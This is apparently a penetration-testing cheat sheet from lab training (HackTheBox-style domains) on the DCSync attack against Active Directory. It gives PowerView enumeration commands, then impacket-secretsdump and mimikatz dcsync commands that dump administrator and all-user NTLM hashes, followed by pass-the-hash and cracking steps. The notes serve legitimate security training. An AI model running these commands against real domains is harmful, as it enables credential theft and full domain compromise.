DCSync
---

DCSync allows an attacker to simulate a Domain Controller and request password data via AD replication.
This retrieves NTLM hashes for domain users (including Domain Admins) without needing access to a Domain Controller.

Use when:
- We have a user with DS-Replication-Get-Changes-All
or
- We have domain admin rights

Enumeration
---
Obtain user SID
```
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

Check ACL permissions
PowerView's Get-ObjectAcl ([https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon))
```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
```
```
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

Attack
---
Kali
```
impacket-secretsdump -just-dc-user administrator [domain/user:"password"@DC-IP]
```
All users
```
impacket-secretsdump htb/Backdoor@10.129.95.210
```

Windows
```
.\mimikatz.exe
```
```
privilege::debug
```
```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
Dump all users
```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all
```

Post-Exploitation
---

Use hashes
- pass-the-hash
- Crack
- Full Domain Compromise
- Start session as user
```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Memory Dumping
---

```
impacket-secretsdump [domain/username:password@target IP]
```

Get admin hash with mimikatz then use the hash with secretsdump

This will dump user hashes 
- We can try to crack them
- Compare hashes to see if there is password reuse - we might know the password
- Use Pass-the Hash


NTDS
---
To dump NTDS you usually need:

- Domain Admin OR
- Replication privileges OR
- Backup Operator privileges OR
- Access to DC disk (local admin)

